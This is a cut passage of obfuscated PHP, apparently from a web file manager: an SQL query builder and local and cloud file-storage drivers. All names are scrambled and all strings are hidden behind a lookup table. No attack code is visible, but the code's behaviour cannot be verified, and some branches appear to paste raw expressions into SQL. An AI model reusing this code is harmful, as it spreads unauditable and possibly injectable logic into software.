$‡·œÈÈí); } $ˆ»ˆó¯î = is_array($³ìëÌëÎ) && isset($³ìëÌëÎ[$‘ËÉîè[1096]]); $‡·œÈÈí = trim($‡·œÈÈí); if (strpos($‡·œÈÈí, $‘ËÉîè[215])) { $»ÉŒ¾œ‹ = explode($‘ËÉîè[215], $‡·œÈÈí); $¡¼‘ÛÖ· = array(); foreach ($»ÉŒ¾œ‹ as $Ğ®âä¬” => $´š“‰™«) { $êŠ’‹¸ = $ˆ»ˆó¯î ? $³ìëÌëÎ[$Ğ®âä¬”] : $³ìëÌëÎ; $¡¼‘ÛÖ·[] = $‘ËÉîè[340] . $this->parseWhereItem($this->parseKey($´š“‰™«), $êŠ’‹¸) . $‘ËÉîè[993]; } $‡ŠÙÇëÖ .= implode($‘ËÉîè[1097], $¡¼‘ÛÖ·); } elseif (strpos($‡·œÈÈí, $‘ËÉîè[287])) { $»ÉŒ¾œ‹ = explode($‘ËÉîè[287], $‡·œÈÈí); $¡¼‘ÛÖ· = array(); foreach ($»ÉŒ¾œ‹ as $Ğ®âä¬” => $´š“‰™«) { $êŠ’‹¸ = $ˆ»ˆó¯î ? $³ìëÌëÎ[$Ğ®âä¬”] : $³ìëÌëÎ; $¡¼‘ÛÖ·[] = $‘ËÉîè[340] . $this->parseWhereItem($this->parseKey($´š“‰™«), $êŠ’‹¸) . $‘ËÉîè[993]; } $‡ŠÙÇëÖ .= implode($‘ËÉîè[1092], $¡¼‘ÛÖ·); } else { $‡ŠÙÇëÖ .= $this->parseWhereItem($this->parseKey($‡·œÈÈí), $³ìëÌëÎ); } } $‡ŠÙÇëÖ .= $‘ËÉîè[358] . $ËµÊÛÎ; } $‡ŠÙÇëÖ = substr($‡ŠÙÇëÖ, 0, -strlen($ËµÊÛÎ)); } return empty($‡ŠÙÇëÖ) ? $‘ËÉîè[12] : $‘ËÉîè[1098] . $‡ŠÙÇëÖ; } protected function parseWhereItem($Òîº£¨¾, $æ“»‹òº) { $áÌƒ—Ü¯ =& $_SERVER[ùèÅ´Ãš]; $Î„ŸÖÎÊ = $áÌƒ—Ü¯[12]; if (is_array($æ“»‹òº)) { if (is_string($æ“»‹òº[0])) { $Ş™Øï¶ = strtolower($æ“»‹òº[0]); if (in_array($æ“»‹òº[0], array($áÌƒ—Ü¯[508], $áÌƒ—Ü¯[1099], $áÌƒ—Ü¯[1100], $áÌƒ—Ü¯[1101], $áÌƒ—Ü¯[1102], $áÌƒ—Ü¯[1103]))) { $Î„ŸÖÎÊ .= $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $æ“»‹òº[0] . $áÌƒ—Ü¯[53] . $this->parseValue($æ“»‹òº[1]); } elseif (preg_match($áÌƒ—Ü¯[1104], $æ“»‹òº[0])) { $Î„ŸÖÎÊ .= $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $this->exp[$Ş™Øï¶] . $áÌƒ—Ü¯[53] . $this->parseValue($æ“»‹òº[1]); } elseif (preg_match($áÌƒ—Ü¯[1105], $æ“»‹òº[0])) { if (is_array($æ“»‹òº[1])) { $µŒ‡äà = isset($æ“»‹òº[2]) ? strtoupper($æ“»‹òº[2]) : $áÌƒ—Ü¯[1090]; if (in_array($µŒ‡äà, array($áÌƒ—Ü¯[1089], $áÌƒ—Ü¯[1090], $áÌƒ—Ü¯[1091]))) { $ğ×œà•’ = array(); foreach ($æ“»‹òº[1] as $âá˜ãÕŞ) { $ğ×œà•’[] = $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $this->exp[$Ş™Øï¶] . $áÌƒ—Ü¯[53] . $this->parseValue($âá˜ãÕŞ); } $Î„ŸÖÎÊ .= $áÌƒ—Ü¯[340] . implode($áÌƒ—Ü¯[53] . $µŒ‡äà . $áÌƒ—Ü¯[53], $ğ×œà•’) . $áÌƒ—Ü¯[993]; } } else { $Î„ŸÖÎÊ .= $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $this->exp[$Ş™Øï¶] . $áÌƒ—Ü¯[53] . $this->parseValue($æ“»‹òº[1]); } } elseif ($áÌƒ—Ü¯[374] == $Ş™Øï¶) { $Î„ŸÖÎÊ .= $áÌƒ—Ü¯[991] . $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $æ“»‹òº[1] . $áÌƒ—Ü¯[1106]; } elseif (preg_match($áÌƒ—Ü¯[1107], $æ“»‹òº[0])) { $Î„ŸÖÎÊ .= $æ“»‹òº[0]; } elseif (preg_match($áÌƒ—Ü¯[1108], $æ“»‹òº[0])) { if (isset($æ“»‹òº[2]) && $áÌƒ—Ü¯[374] == $æ“»‹òº[2]) { $Î„ŸÖÎÊ .= $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $this->exp[$Ş™Øï¶] . $áÌƒ—Ü¯[53] . $æ“»‹òº[1]; } else { if (is_string($æ“»‹òº[1])) { $æ“»‹òº[1] = explode($áÌƒ—Ü¯[50], $æ“»‹òº[1]); } $´•éÜÈÂ = implode($áÌƒ—Ü¯[50], $this->parseValue($æ“»‹òº[1])); $Î„ŸÖÎÊ .= $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $this->exp[$Ş™Øï¶] . $áÌƒ—Ü¯[991] . $´•éÜÈÂ . $áÌƒ—Ü¯[993]; } } elseif (preg_match($áÌƒ—Ü¯[1109], $æ“»‹òº[0])) { $«îïŒ€€ = is_string($æ“»‹òº[1]) ? explode($áÌƒ—Ü¯[50], $æ“»‹òº[1]) : $æ“»‹òº[1]; $Î„ŸÖÎÊ .= $áÌƒ—Ü¯[991] . $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $this->exp[$Ş™Øï¶] . $áÌƒ—Ü¯[53] . $this->parseValue($«îïŒ€€[0]) . $áÌƒ—Ü¯[1092] . $this->parseValue($«îïŒ€€[1]) . $áÌƒ—Ü¯[358]; } else { think_exception(think_lang($áÌƒ—Ü¯[1095]) . $áÌƒ—Ü¯[4] . $æ“»‹òº[0]); } } else { $Â‹§Ü = count($æ“»‹òº); $Ö¯¨Í¡ˆ = $áÌƒ—Ü¯[12]; if (is_string($æ“»‹òº[$Â‹§Ü - 1])) { $Ö¯¨Í¡ˆ = isset($æ“»‹òº[$Â‹§Ü - 1]) ? strtoupper($æ“»‹òº[$Â‹§Ü - 1]) : $áÌƒ—Ü¯[12]; if (in_array($Ö¯¨Í¡ˆ, array($áÌƒ—Ü¯[1089], $áÌƒ—Ü¯[1090], $áÌƒ—Ü¯[1091]))) { $Â‹§Ü = $Â‹§Ü - 1; } } else { $Ö¯¨Í¡ˆ = $áÌƒ—Ü¯[1089]; } for ($Ş¾Âô“š = 0; $Ş¾Âô“š < $Â‹§Ü; $Ş¾Âô“š++) { $«îïŒ€€ = is_array($æ“»‹òº[$Ş¾Âô“š]) ? $æ“»‹òº[$Ş¾Âô“š][1] : $æ“»‹òº[$Ş¾Âô“š]; if ($áÌƒ—Ü¯[374] == strtolower($æ“»‹òº[$Ş¾Âô“š][0])) { $Î„ŸÖÎÊ .= $áÌƒ—Ü¯[340] . $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $«îïŒ€€ . $áÌƒ—Ü¯[1106] . $Ö¯¨Í¡ˆ . $áÌƒ—Ü¯[53]; } else { $†éêëÏ = is_array($æ“»‹òº[$Ş¾Âô“š]) ? $this->exp[strtolower($æ“»‹òº[$Ş¾Âô“š][0])] : $áÌƒ—Ü¯[508]; if (!$†éêëÏ && is_array($æ“»‹òº[$Ş¾Âô“š]) && in_array($æ“»‹òº[$Ş¾Âô“š][0], array($áÌƒ—Ü¯[508], $áÌƒ—Ü¯[1099], $áÌƒ—Ü¯[1100], $áÌƒ—Ü¯[1101], $áÌƒ—Ü¯[1102], $áÌƒ—Ü¯[1103]))) { $†éêëÏ = $æ“»‹òº[$Ş¾Âô“š][0]; } $Î„ŸÖÎÊ .= $áÌƒ—Ü¯[340] . $Òîº£¨¾ . $áÌƒ—Ü¯[53] . $†éêëÏ . $áÌƒ—Ü¯[53] . $this->parseValue($«îïŒ€€) . $áÌƒ—Ü¯[1106] . $Ö¯¨Í¡ˆ . $áÌƒ—Ü¯[53]; } } $Î„ŸÖÎÊ = substr($Î„ŸÖÎÊ, 0, -4); } } else { $Î„ŸÖÎÊ .= $Òîº£¨¾ . $áÌƒ—Ü¯[1110] . $this->parseValue($æ“»‹òº); } return $Î„ŸÖÎÊ; } protected function parseThinkWhere($—õåÀ¨‡, $µ¥Ï¸ªá) { $­º„©«Ô =& $_SERVER[ùèÅ´Ãš]; $ç§½²¨­ = $­º„©«Ô[12]; switch ($—õåÀ¨‡) { case $­º„©«Ô[429]: $ç§½²¨­ = $µ¥Ï¸ªá; break; case $­º„©«Ô[1093]: $ç§½²¨­ = is_string($µ¥Ï¸ªá) ? $µ¥Ï¸ªá : substr($this->parseWhere($µ¥Ï¸ªá), 6); break; case $­º„©«Ô[1111]: parse_str($µ¥Ï¸ªá, $ŠŞû©º½); if (isset($ŠŞû©º½[$­º„©«Ô[1088]])) { $ÁûüÌÍ£ = $­º„©«Ô[53] . strtoupper($ŠŞû©º½[$­º„©«Ô[1088]]) . $­º„©«Ô[53]; unset($ŠŞû©º½[$­º„©«Ô[1088]]); } else { $ÁûüÌÍ£ = $­º„©«Ô[1092]; } $•ü»ÒÛù = array(); foreach ($ŠŞû©º½ as $çã³¢Ÿù => $îèú¹Ñ—) { $•ü»ÒÛù[] = $this->parseKey($çã³¢Ÿù) . $­º„©«Ô[1110] . $this->parseValue($îèú¹Ñ—); } $ç§½²¨­ = implode($ÁûüÌÍ£, $•ü»ÒÛù); break; } return $ç§½²¨­; } protected function parseLimit($ä‰¬®ßô) { $•Úùşâ× =& $_SERVER[ùèÅ´Ãš]; return !empty($ä‰¬®ßô) ? $•Úùşâ×[51] . $ä‰¬®ßô . $•Úùşâ×[53] : $•Úùşâ×[12]; } protected function parseJoin($×ãŞ„°ô) { $øşß¼çì =& $_SERVER[ùèÅ´Ãš]; $„¿ÅÇƒ¹ = $øşß¼çì[12]; if (!empty($×ãŞ„°ô)) { if (is_array($×ãŞ„°ô)) { foreach ($×ãŞ„°ô as $ı†¶‹¶Ó => $ø‚ÜÊ˜¬) { if (!1 !== stripos($ø‚ÜÊ˜¬, $øşß¼çì[1112])) { $„¿ÅÇƒ¹ .= $øşß¼çì[53] . $ø‚ÜÊ˜¬; } else { $„¿ÅÇƒ¹ .= $øşß¼çì[1113] . $ø‚ÜÊ˜¬; } } } else { $„¿ÅÇƒ¹ .= $øşß¼çì[1113] . $×ãŞ„°ô; } } $„¿ÅÇƒ¹ = preg_replace($øşß¼çì[1114], think_config($øşß¼çì[1018]) . $øşß¼çì[1115], $„¿ÅÇƒ¹); return $„¿ÅÇƒ¹; } protected function parseOrder($ÅˆÇıö¼) { $‹«÷ÈÓ =& $_SERVER[ùèÅ´Ãš]; if (is_array($ÅˆÇıö¼)) { $áï¥ĞÓÊ = array(); foreach ($ÅˆÇıö¼ as $Š›ø‰Ø¯ => $»¤°ˆªÏ) { if (is_numeric($Š›ø‰Ø¯)) { $áï¥ĞÓÊ[] = $this->parseKey($»¤°ˆªÏ); } else { $»¤°ˆªÏ = in_array(strtoupper(trim($»¤°ˆªÏ)), array($‹«÷ÈÓ[1116], $‹«÷ÈÓ[1117])) ? $‹«÷ÈÓ[53] . $»¤°ˆªÏ : $‹«÷ÈÓ[12]; if (preg_match($‹«÷ÈÓ[1118], $Š›ø‰Ø¯)) { $áï¥ĞÓÊ[] = $this->parseKey($Š›ø‰Ø¯) . $»¤°ˆªÏ; } else { think_exception($‹«÷ÈÓ[1119] . $Š›ø‰Ø¯); } } } $ÅˆÇıö¼ = implode($‹«÷ÈÓ[50], $áï¥ĞÓÊ); } return !empty($ÅˆÇıö¼) ? $‹«÷ÈÓ[1120] . $ÅˆÇıö¼ : $‹«÷ÈÓ[12]; } protected function parseGroup($İå³°Ïš) { $ìïøß¾½ =& $_SERVER[ùèÅ´Ãš]; return !empty($İå³°Ïš) ? $ìïøß¾½[1121] . $İå³°Ïš : $ìïøß¾½[12]; } protected function parseHaving($­šåÙÚŠ) { $•µ¸³—è =& $_SERVER[ùèÅ´Ãš]; return !empty($­šåÙÚŠ) ? $•µ¸³—è[1122] . $­šåÙÚŠ : $•µ¸³—è[12]; } protected function parseComment($±¦ÚÆŞú) { $¢Õ«Ïå =& $_SERVER[ùèÅ´Ãš]; return !empty($±¦ÚÆŞú) ? $¢Õ«Ïå[1123] . $±¦ÚÆŞú . $¢Õ«Ïå[1124] : $¢Õ«Ïå[12]; } protected function parseDistinct($‚ÈéÂÆÅ) { $×´ÓÂğö =& $_SERVER[ùèÅ´Ãš]; return !empty($‚ÈéÂÆÅ) ? $×´ÓÂğö[1125] : $×´ÓÂğö[12]; } protected function parseUnion($äË¿½ôñ) { $±… §ğ± =& $_SERVER[ùèÅ´Ãš]; if (empty($äË¿½ôñ)) { return $±… §ğ±[12]; } if (isset($äË¿½ôñ[$±… §ğ±[425]])) { $×²÷Œš‚ = $±… §ğ±[1126]; unset($äË¿½ôñ[$±… §ğ±[425]]); } else { $×²÷Œš‚ = $±… §ğ±[1127]; } foreach ($äË¿½ôñ as $äÅ–ğí) { $õ–—±‡İ[] = $×²÷Œš‚ . (is_array($äÅ–ğí) ? $this->buildSelectSql($äÅ–ğí) : $äÅ–ğí); } return implode($±… §ğ±[53], $õ–—±‡İ); } public function insert($íÀóŸù°, $ã•¿âç = array(), $×ÇÀç€¯ = false) { $ˆò’şÉ­ =& $_SERVER[ùèÅ´Ãš]; $ã´Ë½­Ğ = $¡Œ¼²Ñã = array(); $this->model = $ã•¿âç[$ˆò’şÉ­[361]]; foreach ($íÀóŸù° as $Ø¾«‹­Ğ => $µõ”ë²ú) { if (is_array($µõ”ë²ú) && $ˆò’şÉ­[374] == $µõ”ë²ú[0]) { $¡Œ¼²Ñã[] = $this->parseKey($Ø¾«‹­Ğ); $ã´Ë½­Ğ[] = $µõ”ë²ú[1]; } elseif (is_scalar($µõ”ë²ú) || is_null($µõ”ë²ú)) { $¡Œ¼²Ñã[] = $this->parseKey($Ø¾«‹­Ğ); $ã´Ë½­Ğ[] = $this->parseValue($µõ”ë²ú); } } $ëÄ¦ñÕ« = ($×ÇÀç€¯ ? $ˆò’şÉ­[995] : $ˆò’şÉ­[996]) . $ˆò’şÉ­[997] . $this->parseTable($ã•¿âç[$ˆò’şÉ­[359]]) . $ˆò’şÉ­[991] . implode($ˆò’şÉ­[50], $¡Œ¼²Ñã) . $ˆò’şÉ­[992] . implode($ˆò’şÉ­[50], $ã´Ë½­Ğ) . $ˆò’şÉ­[993]; $ëÄ¦ñÕ« .= $this->parseLock(isset($ã•¿âç[$ˆò’şÉ­[927]]) ? $ã•¿âç[$ˆò’şÉ­[927]] : !1); $ëÄ¦ñÕ« .= $this->parseComment(!empty($ã•¿âç[$ˆò’şÉ­[431]]) ? $ã•¿âç[$ˆò’şÉ­[431]] : $ˆò’şÉ­[12]); return $this->execute($ëÄ¦ñÕ«, $this->parseBind(!empty($ã•¿âç[$ˆò’şÉ­[363]]) ? $ã•¿âç[$ˆò’şÉ­[363]] : array())); } public function selectInsert($èòÀ–í, $¢¹¾êÇÑ, $î©²‚¿ò = array()) { $©»„¿ÎÁ =& $_SERVER[ùèÅ´Ãš]; $this->model = $î©²‚¿ò[$©»„¿ÎÁ[361]]; if (is_string($èòÀ–í)) { $èòÀ–í = explode($©»„¿ÎÁ[50], $èòÀ–í); } array_walk($èòÀ–í, array($this, $©»„¿ÎÁ[994])); $ÇÎÎ ª‘ = $©»„¿ÎÁ[1128] . $this->parseTable($¢¹¾êÇÑ) . $©»„¿ÎÁ[991] . implode($©»„¿ÎÁ[50], $èòÀ–í) . $©»„¿ÎÁ[1106]; $ÇÎÎ ª‘ .= $this->buildSelectSql($î©²‚¿ò); return $this->execute($ÇÎÎ ª‘, $this->parseBind(!empty($î©²‚¿ò[$©»„¿ÎÁ[363]]) ? $î©²‚¿ò[$©»„¿ÎÁ[363]] : array())); } public function update($ÂúˆĞ¹, $¦òœ³È€) { $Õ“ª¼ˆ =& $_SERVER[ùèÅ´Ãš]; $this->model = $¦òœ³È€[$Õ“ª¼ˆ[361]]; $À—¡ÄÈ¶ = $Õ“ª¼ˆ[1129] . $this->parseTable($¦òœ³È€[$Õ“ª¼ˆ[359]]) . $this->parseSet($ÂúˆĞ¹) . $this->parseWhere(!empty($¦òœ³È€[$Õ“ª¼ˆ[355]]) ? $¦òœ³È€[$Õ“ª¼ˆ[355]] : $Õ“ª¼ˆ[12]) . $this->parseOrder(!empty($¦òœ³È€[$Õ“ª¼ˆ[443]]) ? $¦òœ³È€[$Õ“ª¼ˆ[443]] : $Õ“ª¼ˆ[12]) . $this->parseLimit(!empty($¦òœ³È€[$Õ“ª¼ˆ[370]]) ? $¦òœ³È€[$Õ“ª¼ˆ[370]] : $Õ“ª¼ˆ[12]) . $this->parseLock(isset($¦òœ³È€[$Õ“ª¼ˆ[927]]) ? $¦òœ³È€[$Õ“ª¼ˆ[927]] : !1) . $this->parseComment(!empty($¦òœ³È€[$Õ“ª¼ˆ[431]]) ? $¦òœ³È€[$Õ“ª¼ˆ[431]] : $Õ“ª¼ˆ[12]); return $this->execute($À—¡ÄÈ¶, $this->parseBind(!empty($¦òœ³È€[$Õ“ª¼ˆ[363]]) ? $¦òœ³È€[$Õ“ª¼ˆ[363]] : array())); } public function delete($Ü»µ¾Ì = array()) { $Ğ Š†î =& $_SERVER[ùèÅ´Ãš]; $this->model = $Ü»µ¾Ì[$Ğ Š†î[361]]; $‘À®Ü®Ÿ = $Ğ Š†î[1130] . $this->parseTable($Ü»µ¾Ì[$Ğ Š†î[359]]) . $this->parseWhere(!empty($Ü»µ¾Ì[$Ğ Š†î[355]]) ? $Ü»µ¾Ì[$Ğ Š†î[355]] : $Ğ Š†î[12]) . $this->parseOrder(!empty($Ü»µ¾Ì[$Ğ Š†î[443]]) ? $Ü»µ¾Ì[$Ğ Š†î[443]] : $Ğ Š†î[12]) . $this->parseLimit(!empty($Ü»µ¾Ì[$Ğ Š†î[370]]) ? $Ü»µ¾Ì[$Ğ Š†î[370]] : $Ğ Š†î[12]) . $this->parseLock(isset($Ü»µ¾Ì[$Ğ Š†î[927]]) ? $Ü»µ¾Ì[$Ğ Š†î[927]] : !1) . $this->parseComment(!empty($Ü»µ¾Ì[$Ğ Š†î[431]]) ? $Ü»µ¾Ì[$Ğ Š†î[431]] : $Ğ Š†î[12]); return $this->execute($‘À®Ü®Ÿ, $this->parseBind(!empty($Ü»µ¾Ì[$Ğ Š†î[363]]) ? $Ü»µ¾Ì[$Ğ Š†î[363]] : array())); } public function select($Òô°óá® = array()) { $âêÍÄàÁ =& $_SERVER[ùèÅ´Ãš]; $this->model = $Òô°óá®[$âêÍÄàÁ[361]]; $†›ŒŞ® = $this->buildSelectSql($Òô°óá®); $³¼ÔÀòÏ = isset($Òô°óá®[$âêÍÄàÁ[426]]) ? $Òô°óá®[$âêÍÄàÁ[426]] : !1; if ($³¼ÔÀòÏ) { $ÙåÖ½åİ = is_string($³¼ÔÀòÏ[$âêÍÄàÁ[97]]) ? $³¼ÔÀòÏ[$âêÍÄàÁ[97]] : $âêÍÄàÁ[1131] . md5($†›ŒŞ®); $¬â¹ = think_cache($ÙåÖ½åİ, $âêÍÄàÁ[12], $³¼ÔÀòÏ); if (!1 !== $¬â¹) { return $¬â¹; } } $¹á¥«å¾ = $this->query($†›ŒŞ®, $this->parseBind(!empty($Òô°óá®[$âêÍÄàÁ[363]]) ? $Òô°óá®[$âêÍÄàÁ[363]] : array())); if ($³¼ÔÀòÏ && !1 !== $¹á¥«å¾) { think_cache($ÙåÖ½åİ, $¹á¥«å¾, $³¼ÔÀòÏ); } return $¹á¥«å¾; } public function buildSelectSql($Çæ•”Àî = array()) { $ûÄµ–Æ =& $_SERVER[ùèÅ´Ãš]; if (isset($Çæ•”Àî[$ûÄµ–Æ[430]])) { if (strpos($Çæ•”Àî[$ûÄµ–Æ[430]], $ûÄµ–Æ[50])) { list($ÌÄÙçœ¿, $”Œê«€Æ) = explode($ûÄµ–Æ[50], $Çæ•”Àî[$ûÄµ–Æ[430]]); } else { $ÌÄÙçœ¿ = $Çæ•”Àî[$ûÄµ–Æ[430]]; } $ÌÄÙçœ¿ = $ÌÄÙçœ¿ ? $ÌÄÙçœ¿ : 1; $”Œê«€Æ = isset($”Œê«€Æ) ? $”Œê«€Æ : (is_numeric($Çæ•”Àî[$ûÄµ–Æ[370]]) ? $Çæ•”Àî[$ûÄµ–Æ[370]] : 20); $•¾ÎÄ²š = $”Œê«€Æ * ((int) $ÌÄÙçœ¿ - 1); $Çæ•”Àî[$ûÄµ–Æ[370]] = $•¾ÎÄ²š . $ûÄµ–Æ[50] . $”Œê«€Æ; } if (think_config($ûÄµ–Æ[1132])) { $¨¹‘ó»Œ = $ûÄµ–Æ[1133] . md5(serialize($Çæ•”Àî)); $•„¹İ¾Û = think_cache($¨¹‘ó»Œ); if ($•„¹İ¾Û) { return $•„¹İ¾Û; } } $Ë°Ë¡‹² = $this->parseSql($this->selectSql, $Çæ•”Àî); $Ë°Ë¡‹² .= $this->parseLock(isset($Çæ•”Àî[$ûÄµ–Æ[927]]) ? $Çæ•”Àî[$ûÄµ–Æ[927]] : !1); if (isset($¨¹‘ó»Œ)) { think_cache($¨¹‘ó»Œ, $Ë°Ë¡‹²); } return $Ë°Ë¡‹²; } public function parseSql($ŒÒ‚¡Òú, $—–‰üÊ÷ = array()) { $ß„ééÑ÷ =& $_SERVER[ùèÅ´Ãš]; $ŒÒ‚¡Òú = str_replace(array($ß„ééÑ÷[1134], $ß„ééÑ÷[1135], $ß„ééÑ÷[1136], $ß„ééÑ÷[1137], $ß„ééÑ÷[1138], $ß„ééÑ÷[1139], $ß„ééÑ÷[1140], $ß„ééÑ÷[1141], $ß„ééÑ÷[1142], $ß„ééÑ÷[1143], $ß„ééÑ÷[1144]), array($this->parseTable("{$—–‰üÊ÷[$ß„ééÑ÷[359]]}"), $this->parseDistinct(isset($—–‰üÊ÷[$ß„ééÑ÷[1145]]) ? $—–‰üÊ÷[$ß„ééÑ÷[1145]] : !1), $this->parseField(!empty($—–‰üÊ÷[$ß„ééÑ÷[353]]) ? $—–‰üÊ÷[$ß„ééÑ÷[353]] : $ß„ééÑ÷[223]), $this->parseJoin(!empty($—–‰üÊ÷[$ß„ééÑ÷[362]]) ? $—–‰üÊ÷[$ß„ééÑ÷[362]] : $ß„ééÑ÷[12]), $this->parseWhere(!empty($—–‰üÊ÷[$ß„ééÑ÷[355]]) ? $—–‰üÊ÷[$ß„ééÑ÷[355]] : $ß„ééÑ÷[12]), $this->parseGroup(!empty($—–‰üÊ÷[$ß„ééÑ÷[582]]) ? $—–‰üÊ÷[$ß„ééÑ÷[582]] : $ß„ééÑ÷[12]), $this->parseHaving(!empty($—–‰üÊ÷[$ß„ééÑ÷[1146]]) ? $—–‰üÊ÷[$ß„ééÑ÷[1146]] : $ß„ééÑ÷[12]), $this->parseOrder(!empty($—–‰üÊ÷[$ß„ééÑ÷[443]]) ? $—–‰üÊ÷[$ß„ééÑ÷[443]] : $ß„ééÑ÷[12]), $this->parseLimit(!empty($—–‰üÊ÷[$ß„ééÑ÷[370]]) ? $—–‰üÊ÷[$ß„ééÑ÷[370]] : $ß„ééÑ÷[12]), $this->parseUnion(!empty($—–‰üÊ÷[$ß„ééÑ÷[424]]) ? $—–‰üÊ÷[$ß„ééÑ÷[424]] : $ß„ééÑ÷[12]), $this->parseComment(!empty($—–‰üÊ÷[$ß„ééÑ÷[431]]) ? $—–‰üÊ÷[$ß„ééÑ÷[431]] : $ß„ééÑ÷[12])), $ŒÒ‚¡Òú); return $ŒÒ‚¡Òú; } public function getLastSql($¸äªŞĞó = '') { return $¸äªŞĞó ? $this->modelSql[$¸äªŞĞó] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($·ø¦ÕÑá) { return addslashes($·ø¦ÕÑá); } public function setModel($“—Øˆ‹‰) { $this->model = $“—Øˆ‹‰; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto F¾„¨é¦Çì; d‘Ùš™ƒÀ: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($–¹×°Øà) { parent::__construct($–¹×°Øà); $this->setSignVersion($_SERVER[ùèÅ´Ãš][250]); } public function uploadLink($ìòğÖ’ò, $øŒù¡ = 0) { $–é“ÅÅ  =& $_SERVER[ùèÅ´Ãš]; if ($this->isUploadServer()) { return; } $§Åß¯‰Ë = $this->getType(); if (!in_array($§Åß¯‰Ë, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ş¼Íæ“Ü = (!$øŒù¡ ? 1 : ceil($øŒù¡ / pow(1024, 3))) * 3600 * 4; $ä‡í±ƒ = $this->uploadMultiData($ìòğÖ’ò, $Ş¼Íæ“Ü); if ($ä‡í±ƒ) { $ä‡í±ƒ[$–é“ÅÅ [97]] = $ìòğÖ’ò; $ä‡í±ƒ[$–é“ÅÅ [98]] = $§Åß¯‰Ë; } return $ä‡í±ƒ; } public function fileOutImage($»¹Òš¹µ, $øÜ›Üõ¥ = 250) { if ($this->size($»¹Òš¹µ) > 1024 * 1024 * 25) { return $this->fileOutImageServer($»¹Òš¹µ, $øÜ›Üõ¥); } $Ÿùã€ ¾ = $this->link($»¹Òš¹µ); $Ÿùã€ ¾ .= $_SERVER[ùèÅ´Ãš][1475] . $øÜ›Üõ¥; $this->fileOutLink($Ÿùã€ ¾); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($ùÙûÃù) { if (substr($ùÙûÃù, 0, 2) == $_SERVER[ùèÅ´Ãš][1432]) { $ùÙûÃù = BASIC_PATH . substr($ùÙûÃù, 2); } return $ùÙûÃù; } public function iconvApp($’˜Àû’) { $ÑÏÉä‡« =& $_SERVER[ùèÅ´Ãš]; global $config; return $this->iconvTo($’˜Àû’, $config[$ÑÏÉä‡«[1461]], $config[$ÑÏÉä‡«[1460]]); } public function iconvSystem($şß¢×£) { $˜­Å‘Ë =& $_SERVER[ùèÅ´Ãš]; global $config; return $this->iconvTo($şß¢×£, $config[$˜­Å‘Ë[1460]], $config[$˜­Å‘Ë[1461]]); } public function getPathOuter($˜€²ı†¿) { $”½¢ÇºŸ =& $_SERVER[ùèÅ´Ãš]; $”óì¶÷ñ = $this->iconvApp($this->pathBase); $˜€²ı†¿ = $this->iconvApp($˜€²ı†¿); if (substr($”óì¶÷ñ, 0, 2) == $”½¢ÇºŸ[1432]) { $”óì¶÷ñ = BASIC_PATH . substr($”óì¶÷ñ, 2); } if (substr($˜€²ı†¿, 0, 2) == $”½¢ÇºŸ[1432]) { $˜€²ı†¿ = BASIC_PATH . substr($˜€²ı†¿, 2); } $”óì¶÷ñ = KodIO::clear($”óì¶÷ñ); $˜€²ı†¿ = KodIO::clear($˜€²ı†¿); $˜€²ı†¿ = substr($˜€²ı†¿, strlen($”óì¶÷ñ)); if (empty($this->pathDriver)) { return $˜€²ı†¿; } return $this->pathDriver . $”½¢ÇºŸ[8] . ltrim($˜€²ı†¿, $”½¢ÇºŸ[8]); } public function mkfile($¶ÌŸóã¶, $”¹¹÷šÏ = '', $üñ£Õ = REPEAT_RENAME) { $¶ÌŸóã¶ = $this->iconvSystem($¶ÌŸóã¶); @touch($¶ÌŸóã¶); if ($”¹¹÷šÏ) { file_put_contents($¶ÌŸóã¶, $”¹¹÷šÏ); } @chmod($¶ÌŸóã¶, $this->pathAuth); if (is_file($¶ÌŸóã¶)) { return $this->getPathOuter($¶ÌŸóã¶); } $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); return !1; } public function mkdir($ë‰¿…êĞ, $§ÕÎœ—Ò = REPEAT_SKIP) { $ë‰¿…êĞ = $this->iconvSystem($ë‰¿…êĞ); if (is_dir($ë‰¿…êĞ)) { return $this->getPathOuter($ë‰¿…êĞ); } @mkdir($ë‰¿…êĞ, $this->pathAuth, !0); @chmod($ë‰¿…êĞ, $this->pathAuth); if (is_dir($ë‰¿…êĞ)) { return $this->getPathOuter($ë‰¿…êĞ); } $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); return !1; } public function copyFile($°ã¨Ğ¢í, $¹¥Ûôúé) { $this->mkdir($this->pathFather($¹¥Ûôúé)); $°ã¨Ğ¢í = $this->iconvSystem($°ã¨Ğ¢í); $¹¥Ûôúé = $this->iconvSystem($¹¥Ûôúé); $°¹–Ï¾ = copy_64($°ã¨Ğ¢í, $¹¥Ûôúé); @chmod($¹¥Ûôúé, $this->pathAuth); if ($°¹–Ï¾) { return $this->getPathOuter($¹¥Ûôúé); } $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); return !1; } public function moveFile($òº©¾, $©ï×ó¡§) { $this->mkdir($this->pathFather($©ï×ó¡§)); $òº©¾ = $this->iconvSystem($òº©¾); $©ï×ó¡§ = $this->iconvSystem($©ï×ó¡§); $–îÌ¸  = intval(@rename($òº©¾, $©ï×ó¡§)); if (!$–îÌ¸ ) { if ($–îÌ¸  = intval(@copy_64($òº©¾, $©ï×ó¡§))) { @unlink($òº©¾); } } @chmod($©ï×ó¡§, $this->pathAuth); if ($–îÌ¸ ) { return $this->getPathOuter($©ï×ó¡§); } $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); return !1; } public function movePath($ÍÎ…ÄÎå, $ø¾¿÷¦ù, $±Œ…´ï’ = false) { $ø˜¼ =& $_SERVER[ùèÅ´Ãš]; $ÍÎ…ÄÎå = 